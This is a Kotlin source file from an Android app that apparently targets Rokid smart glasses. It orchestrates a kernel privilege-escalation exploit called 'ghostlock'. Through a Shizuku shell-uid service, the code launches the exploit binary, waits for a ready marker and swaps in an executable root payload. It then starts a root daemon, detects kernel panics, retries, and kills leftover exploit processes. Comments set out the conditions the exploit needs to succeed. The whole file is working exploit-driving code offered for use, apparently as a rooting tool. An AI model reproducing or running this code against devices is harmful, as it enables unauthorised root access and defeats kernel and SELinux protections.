package com.rokid.rc.glasses.ghost

import android.content.ComponentName
import com.rokid.rc.shared.protocol.GhostlockCodes
import com.rokid.rc.shared.protocol.ProgressCodec
import com.rokid.rc.shared.protocol.ProgressEvent
import com.rokid.rc.glasses.GlassesPaths
import android.content.Context
import android.content.ServiceConnection
import android.content.pm.PackageManager
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import rikka.shizuku.Shizuku
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * ghostlock LPE 觸發層（Shizuku/UserService 版）。
 *
 * 背景（研究結論，見 docs/shizuku-feasibility-report.md）：
 *  - exploit 必須以 shell (uid 2000) 執行；App（untrusted_app）直跑會 kernel panic。
 *  - Shizuku server 以 adb shell 啟動時，UserService 進程 = uid 2000 + u:r:shell:s0，
 *    等同 adb shell → 是 App 內唯一乾淨的 shell 身份通道。
 *  - server 以 root 啟動時子程序變 uid 0/kernel context（exploit 要 unprivileged 起跑，
 *    不可用）→ 偵測到時改用 run_shell 包裝降權，或明確報錯。
 *
 * 流程與 ShellGhostlockEngine 相同（launch → ready → install → done）：
 *   LAUNCH : userService.runCommandStream("ENV… /data/local/tmp/ghostlock_rv101")
 *   READY  : 輪詢 rootScriptPath 出現 readyMarker
 *   INSTALL: userService.writeFile(rootScriptPath, payload, exec=true)
 *            （或 useDirectPayloadWrite=true 時 App 直寫，需 setup_direct.sh 的 symlink）
 *   DONE   : 輪詢 payloadLog 出現 doneMarker
 *   ⚠ 順序不可顛倒：exploit 啟動 ~2s 會寫出自己的預設腳本，先寫 payload 會被覆蓋。
 *
 * kernel-panic/重啟偵測：執行前記錄 /proc/uptime，逾時路徑比對是否倒退。
 *
 * fallback：preflight 失敗（server 未啟動/未授權/綁定失敗）時，若 [fallback] 非空
 * （AppGraph 會注入 BridgeGhostlockEngine），自動委託既有 bridge helper 流程。
 */
class ShizukuGhostlockEngine(
    private val context: Context,
    private val config: ExploitConfig = ExploitConfig(),
    private val useDirectPayloadWrite: Boolean = false,
    private val fallback: GhostlockEngine? = null,
) : GhostlockEngine {

    private val payloadLog = GhostlockPaths.payloadLog(context)
    private val exploitLog = GhostlockPaths.exploitLog(context)
    private val permissionRequested = AtomicBoolean(false)

    @Volatile
    override var isEnabled: Boolean = false
        private set

    override fun setEnabled(enabled: Boolean) { isEnabled = enabled }

    override fun doneLog(): File = payloadLog

    override var onProgress: ((ProgressEvent) -> Unit)? = null

    @Volatile
    override var rootAcquired: Boolean = false
        private set

    override suspend fun acquireRoot(): ExecResult {
        val client = RootDaemonClient()
        if (client.isRoot()) {
            rootAcquired = true
            progress(GhostlockCodes.SKIP_LPE)
            return ExecResult.ok(Stage.DONE, "already rooted")
        }
        val result = exec(LedPayloads.startRootDaemon(doneLog()))
        rootAcquired = result.success
        return result
    }

    override suspend fun exec(payload: RootScript): ExecResult = withContext(Dispatchers.IO) {
        // 0. preflight：Shizuku binder / 權限 / UserService 綁定
        if (!Shizuku.pingBinder()) {
            return@withContext fallbackExec(
                Stage.PREFLIGHT, payload,
                GhostlockCodes.SHIZUKU_NOT_RUNNING
            )
        }
        val granted = runCatching { Shizuku.checkSelfPermission() }
            .getOrDefault(PackageManager.PERMISSION_DENIED)
        if (granted != PackageManager.PERMISSION_GRANTED) {
            if (permissionRequested.compareAndSet(false, true)) {
                runCatching { Shizuku.requestPermission(REQUEST_CODE) }
            }
            return@withContext fallbackExec(Stage.PREFLIGHT, payload, GhostlockCodes.SHIZUKU_UNAUTHORIZED)
        }

        val svc = bindCommandService()
            ?: return@withContext fallbackExec(Stage.PREFLIGHT, payload, GhostlockCodes.SHIZUKU_BIND_FAILED)

        try {
            execInternal(svc, payload)
        } finally {
            runCatching { Shizuku.unbindUserService(svc.args, svc.conn, false) }
        }
    }

    // ---- internals ----

    /** exploit 輸出流是否已結束（行程死亡）。onExit 回呼設定，供 fast-fail 偵測。 */
    @Volatile
    private var streamEnded = false

    private fun execInternal(svc: BoundService, payload: RootScript): ExecResult {
        val binary = File(config.binaryPath)
        if (!binary.exists() || !binary.canExecute()) {
            return ExecResult.fail(Stage.PREFLIGHT, ProgressCodec.encode(GhostlockCodes.BINARY_MISSING, binary.absolutePath))
        }

        payloadLog.delete()
        exploitLog.delete()
        val bootStamp = currentUptime()

        // 身份驗證：server 必須是 shell(2000)；若 root 啟動則用 run_shell 降權
        val id = svc.service.runCommand("id")
        val runPrefix: String = when {
            id.contains("uid=2000") -> ""
            id.contains("uid=0") -> {
                val runShell = File(RUN_SHELL_PATH)
                if (runShell.exists() && runShell.canExecute()) {
                    progress(GhostlockCodes.SHIZUKU_ROOT_RUN_SHELL)
                    RUN_SHELL_PATH + " "
                } else {
                    return ExecResult.fail(
                        Stage.PREFLIGHT,
                        GhostlockCodes.SHIZUKU_NO_RUN_SHELL
                    )
                }
            }
            else -> {
                return ExecResult.fail(Stage.PREFLIGHT, ProgressCodec.encode(GhostlockCodes.SHIZUKU_BAD_IDENTITY, id))
            }
        }

        // 內部重試（同 helper 的 MAX_TRY=3 行為）：
        // exploit 被 OOM 殺 / FOPS install failed / ready 逾時 → 清殘留行程重試；
        // kernel panic（uptime 倒退）→ 無法同 boot 繼續，直接回報失敗。
        val envPrefix = config.env.joinToString(" ")
        val cmd = "$envPrefix $runPrefix${config.binaryPath}"

        for (attempt in 1..MAX_INTERNAL_TRY) {
            progress(GhostlockCodes.ATTEMPT_SHIZUKU, "$attempt/$MAX_INTERNAL_TRY")
            streamEnded = false
            // 清上次殘留（同 helper：跑前 rm -f 預設腳本與 log）
            svc.service.runCommand("rm -f ${config.rootScriptPath} 2>/dev/null || true")
            svc.service.runCommandStream(cmd, streamCallback(exploitLog))

            // 1. ready
            progress(GhostlockCodes.WAIT_READY)
            if (!waitFor(config.readyTimeoutMs) { readySeen() }) {
                if (bootChanged(bootStamp)) {
                    return ExecResult.fail(Stage.READY, GhostlockCodes.KERNEL_PANIC)
                }
                val why = if (streamEnded) GhostlockCodes.PROCESS_DIED else GhostlockCodes.READY_TIMEOUT_RETRY
                progress(GhostlockCodes.RETRY_AFTER, why)
                killExploit(svc)
                continue
            }

            // 2. install payload
            progress(GhostlockCodes.PAYLOAD_REPLACED)
            val installed = if (useDirectPayloadWrite) {
                installPayloadDirect(payload)
            } else {
                svc.service.writeFile(config.rootScriptPath, payload.content.toByteArray(), true)
            }
            if (!installed) {
                killExploit(svc)
                return ExecResult.fail(Stage.INSTALL, ProgressCodec.encode(GhostlockCodes.PAYLOAD_WRITE_FAILED, config.rootScriptPath))
            }

            // 3. done
            progress(GhostlockCodes.WAIT_PAYLOAD)
            if (!waitFor(config.doneTimeoutMs) { doneSeen() }) {
                if (bootChanged(bootStamp)) {
                    return ExecResult.fail(Stage.DONE, GhostlockCodes.KERNEL_PANIC)
                }
                if (streamEnded) {
                    progress(GhostlockCodes.PROCESS_DIED_RETRY)
                    killExploit(svc)
                    continue
                }
                return ExecResult.fail(Stage.DONE, ProgressCodec.encode(GhostlockCodes.PAYLOAD_TIMEOUT, readTail(payloadLog, 800)))
            }
            // 成功：清殘留 idle exploit 行程（同 helper 行為；root_daemon 不受影響）
            killExploit(svc)
            return ExecResult.ok(Stage.DONE, readTail(payloadLog, 4000))
        }
        return ExecResult.fail(Stage.DONE, ProgressCodec.encode(GhostlockCodes.ATTEMPTS_EXHAUSTED, "$MAX_INTERNAL_TRY / " + exploitLog.absolutePath))
    }

    private fun killExploit(svc: BoundService) {
        // 同 helper 的 pkill 行為：清殘留 exploit 行程後重試
        runCatching { svc.service.runCommand("pkill -9 -f ghostlock_rv101 2>/dev/null || true") }
    }

    /** 流式回呼：全量寫入 exploitLog，僅已知關鍵行轉送給 onProgress（避免洗版）。 */
    private fun streamCallback(log: File): ICommandCallback =
        object : ICommandCallback.Stub() {
            override fun onLine(line: String) {
                try {
                    log.appendText(line + "\n")
                } catch (_: Exception) {
                }
                for (m in PROGRESS_MARKERS) {
                    if (line.contains(m)) {
                        progress(GhostlockCodes.EXPLOIT_OUTPUT, line.take(120))
                        break
                    }
                }
            }

            override fun onExit(exitCode: Int) {
                // 僅紀錄；流程判定以 ready/done 標記為準（exploit 完成前不會正常退出）
                Log.i(TAG, "exploit process exited code=$exitCode")
                streamEnded = true
            }
        }

    private class BoundService(
        val args: Shizuku.UserServiceArgs,
        val conn: ServiceConnection,
        val service: ICommandService,
    )

    private fun bindCommandService(): BoundService? {
        val args = Shizuku.UserServiceArgs(
            ComponentName(context.packageName, CommandService::class.java.name)
        ).daemon(true).processNameSuffix("ghost").version(1)

        val latch = CountDownLatch(1)
        var binder: IBinder? = null
        val conn = object : ServiceConnection {
            override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                binder = service
                latch.countDown()
            }

            override fun onServiceDisconnected(name: ComponentName?) {
                Log.w(TAG, "CommandService disconnected")
            }
        }
        try {
            Shizuku.bindUserService(args, conn)
        } catch (e: Exception) {
            Log.e(TAG, "bindUserService failed: ${e.message}")
            return null
        }
        if (!latch.await(BIND_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
            Log.e(TAG, "bindUserService timeout")
            runCatching { Shizuku.unbindUserService(args, conn, false) }
            return null
        }
        val svc = binder?.let { ICommandService.Stub.asInterface(it) }
        if (svc == null) {
            runCatching { Shizuku.unbindUserService(args, conn, false) }
            return null
        }
        return BoundService(args, conn, svc)
    }

    /** Shizuku 路徑不可用時委託 fallback（AppGraph 注入 BridgeGhostlockEngine）。 */
    private suspend fun fallbackExec(stage: String, payload: RootScript, message: String): ExecResult {
        val fb = fallback
        if (fb != null) {
            progress(GhostlockCodes.SHIZUKU_UNAVAILABLE, message)
            return try {
                fb.exec(payload)
            } catch (e: Exception) {
                ExecResult.fail(stage, ProgressCodec.encode(GhostlockCodes.FALLBACK_FAILED, e.message))
            }
        }
        return ExecResult.fail(stage, message)
    }

    private fun readySeen(): Boolean = try {
        File(config.rootScriptPath).readText().contains(config.readyMarker)
    } catch (e: Exception) { false }

    private fun installPayloadDirect(payload: RootScript): Boolean = try {
        val target = File(config.rootScriptPath)
        target.writeText(payload.content)
        target.setExecutable(true, false)
        true
    } catch (e: Exception) {
        Log.e(TAG, "installPayloadDirect failed", e)
        false
    }

    private fun doneSeen(): Boolean =
        payloadLog.exists() && payloadLog.readText().contains(config.doneMarker)

    private fun currentUptime(): Double = try {
        File("/proc/uptime").readText().trim().substringBefore(' ').toDouble()
    } catch (e: Exception) { -1.0 }

    private fun bootChanged(prev: Double): Boolean {
        if (prev < 0) return false
        val cur = currentUptime()
        return cur < prev // uptime 倒退 = 已重啟（kernel panic）
    }

    private fun waitFor(timeoutMs: Long, cond: () -> Boolean): Boolean {
        val deadline = SystemClock.elapsedRealtime() + timeoutMs
        while (SystemClock.elapsedRealtime() < deadline) {
            if (cond()) return true
            Thread.sleep(config.pollIntervalMs)
        }
        return cond()
    }

    private fun readTail(file: File, max: Int): String = try {
        if (!file.exists()) "(none)" else file.readText().takeLast(max)
    } catch (e: Exception) { "(unreadable)" }

    companion object {
        private const val TAG = "ShizukuGhostlockEngine"
        private const val REQUEST_CODE = 7700
        private const val BIND_TIMEOUT_MS = 15_000L
        private const val MAX_INTERNAL_TRY = 3
        private const val RUN_SHELL_PATH = GlassesPaths.RUN_SHELL
        private val PROGRESS_MARKERS = listOf(
            "FOPS install failed",
            "dropping to root shell",
            "child is root",
            "SELinux",
            "panic",
            "killed",
        )
    }
}
